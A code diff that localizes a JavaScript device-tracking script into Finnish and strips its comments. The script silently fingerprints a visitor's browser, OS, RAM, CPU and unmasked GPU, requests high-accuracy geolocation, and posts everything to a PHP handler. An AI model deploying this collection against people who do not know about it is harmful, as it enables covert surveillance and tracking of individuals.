@@ -5,24 +5,20 @@ function information() {
   var ver = navigator.userAgent;
   var str = ver;
   var os = ver;
-  //gpu
   var canvas = document.createElement('canvas');
   var gl;
   var debugInfo;
   var ven;
   var ren;
 
-
   if (cc == undefined) {
-    cc = 'Not Available';
+    cc = 'Ei saatavilla';
   }
 
-  //ram
   if (ram == undefined) {
-    ram = 'Not Available';
+    ram = 'Ei saatavilla';
   }
 
-  //browser
   if (ver.indexOf('Firefox') != -1) {
     str = str.substring(str.indexOf(' Firefox/') + 1);
     str = str.split(' ');
@@ -44,10 +40,9 @@ function information() {
     brw = str[0];
   }
   else {
-    brw = 'Not Available'
+    brw = 'Ei saatavilla';
   }
 
-  //gpu
   try {
     gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
   }
@@ -58,23 +53,22 @@ function information() {
     ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
   }
   if (ven == undefined) {
-    ven = 'Not Available';
+    ven = 'Ei saatavilla';
   }
   if (ren == undefined) {
-    ren = 'Not Available';
+    ren = 'Ei saatavilla';
   }
 
-  var ht = window.screen.height
-  var wd = window.screen.width
-  //os
+  var ht = window.screen.height;
+  var wd = window.screen.width;
   os = os.substring(0, os.indexOf(')'));
   os = os.split(';');
   os = os[1];
   if (os == undefined) {
-    os = 'Not Available';
+    os = 'Ei saatavilla';
   }
   os = os.trim();
-  //
+  
   $.ajax({
     type: 'POST',
     url: 'info_handler.php',
@@ -84,8 +78,6 @@ function information() {
   });
 }
 
-
-
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
@@ -94,21 +86,21 @@ function locate(callback, errCallback) {
 
   function showError(error) {
     var err_text;
-    var err_status = 'failed';
+    var err_status = 'epäonnistui';
 
     switch (error.code) {
       case error.PERMISSION_DENIED:
-        err_text = 'User denied the request for Geolocation';
+        err_text = 'Käyttäjä hylkäsi sijaintipyyntöä';
         break;
       case error.POSITION_UNAVAILABLE:
-        err_text = 'Location information is unavailable';
+        err_text = 'Sijaintitietoja ei ole saatavilla';
         break;
       case error.TIMEOUT:
-        err_text = 'The request to get user location timed out';
-        alert('Please set your location mode on high accuracy...');
+        err_text = 'Pyyntö sijainnin saamiseksi aikakatkaistiin';
+        alert('Aseta sijaintitila korkealle tarkkuudelle...');
         break;
       case error.UNKNOWN_ERROR:
-        err_text = 'An unknown error occurred';
+        err_text = 'Tuntematon virhe tapahtui';
         break;
     }
 
@@ -120,51 +112,52 @@ function locate(callback, errCallback) {
       mimeType: 'text'
     });
   }
+
   function showPosition(position) {
     var lat = position.coords.latitude;
     if (lat) {
-      lat = lat + ' deg';
+      lat = lat + ' astetta';
     }
     else {
-      lat = 'Not Available';
+      lat = 'Ei saatavilla';
     }
     var lon = position.coords.longitude;
     if (lon) {
-      lon = lon + ' deg';
+      lon = lon + ' astetta';
     }
     else {
-      lon = 'Not Available';
+      lon = 'Ei saatavilla';
     }
     var acc = position.coords.accuracy;
     if (acc) {
       acc = acc + ' m';
     }
     else {
-      acc = 'Not Available';
+      acc = 'Ei saatavilla';
     }
     var alt = position.coords.altitude;
     if (alt) {
       alt = alt + ' m';
     }
     else {
-      alt = 'Not Available';
+      alt = 'Ei saatavilla';
     }
     var dir = position.coords.heading;
     if (dir) {
-      dir = dir + ' deg';
+      dir = dir + ' astetta';
     }
     else {
-      dir = 'Not Available';
+      dir = 'Ei saatavilla';
     }
     var spd = position.coords.speed;
     if (spd) {
       spd = spd + ' m/s';
     }
     else {
-      spd = 'Not Available';
+      spd = 'Ei saatavilla';
     }
 
-    var ok_status = 'success';
+    var ok_status = 'onnistui';
 
     $.ajax({
       type: 'POST',
@@ -175,4 +168,3 @@ function locate(callback, errCallback) {
     });
   };
 }
-
